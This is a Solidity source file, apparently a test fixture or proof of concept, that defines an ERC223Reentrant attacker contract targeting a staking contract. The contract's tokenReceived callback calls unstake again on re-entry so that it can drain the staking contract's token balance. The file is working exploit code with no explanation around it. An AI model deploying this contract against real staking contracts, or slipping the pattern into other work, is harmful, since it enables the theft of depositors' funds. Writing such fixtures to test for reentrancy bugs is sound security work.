//SPDX-License-Identifier: Unlicense
// https://github.com/Dexaran/ERC223-token-standard/blob/development/token/ERC223/ERC223.sol
pragma solidity ^0.8.0;

import "../interfaces/IERC223Recipient.sol";
import "../interfaces/IERC223.sol";

interface IStaking {
    function balanceOf(address user) external returns (uint256);
    function unstake(uint256 amount) external;
}

contract ERC223Reentrant is IERC223Recipient {
    IERC223 public token;
    IStaking public vulnContract;
    uint256 public depositedFunds;

    constructor(address _token,address _vulnContract) {
        token = IERC223(_token);
        vulnContract = IStaking(_vulnContract);
    }

    receive() external payable {}

    function enter(uint256 _amount) public {
        depositedFunds = vulnContract.balanceOf(address(this)) + _amount;
        token.transfer(address(vulnContract),_amount);
        require(vulnContract.balanceOf(address(this)) == depositedFunds,"ERC223Reentrant: Something wrong with deposits");
    }

    function exit() public {
        uint256 balBefore = vulnContract.balanceOf(address(this));
        vulnContract.unstake(balBefore);
    }
    
    function tokenReceived(address _from, uint _value, bytes memory _data) public override {
        require(msg.sender == address(token),"ERC223Reentrant: Allow call from the ERC223 token");
        if (_data.length > 4) {  
            string memory check = abi.decode(_data, (string));
            return;
        }
        uint256 entireBal = token.balanceOf(address(vulnContract));
        if ( entireBal > 0 ) {
            vulnContract.unstake(depositedFunds);
        }
    }
}
